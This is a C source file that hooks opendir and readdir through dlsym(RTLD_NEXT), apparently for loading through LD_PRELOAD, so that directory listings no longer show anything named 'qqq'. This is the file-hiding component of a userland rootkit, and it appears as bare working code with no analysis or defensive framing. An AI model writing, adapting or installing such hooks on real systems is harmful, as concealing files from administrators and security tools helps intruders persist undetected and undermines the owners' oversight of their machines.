#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>

DIR *opendir (const char *name) {
    DIR *(*opendir) (const char *name);
    DIR *tmp;
    
    opendir = dlsym (RTLD_NEXT, "opendir");


    if (strstr(name, "qqq"))
        return NULL;

    return opendir(name);
}

struct dirent *readdir(DIR *dirp) {
    struct dirent *(*new_readdir) (DIR *dirp);
    struct dirent *tmp;
    new_readdir = dlsym (RTLD_NEXT, "readdir");
    tmp = new_readdir (dirp);

    if (tmp && !strcoll (tmp->d_name, "qqq"))
        return new_readdir (dirp);
    return tmp;
}
